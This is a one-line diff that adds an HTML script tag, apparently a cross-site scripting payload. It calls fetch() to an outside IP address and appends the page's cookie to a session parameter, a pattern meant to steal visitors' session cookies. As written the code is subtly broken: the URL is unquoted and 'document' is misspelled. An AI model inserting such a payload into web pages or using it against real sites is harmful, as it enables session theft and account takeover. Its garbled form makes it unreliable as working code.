@@ -1,0 +1,1 @@
+<script>fetch(http://10.42.237.176:80/.session=Tm90aGluZyBIZXJl + documnt.cookie)</script>
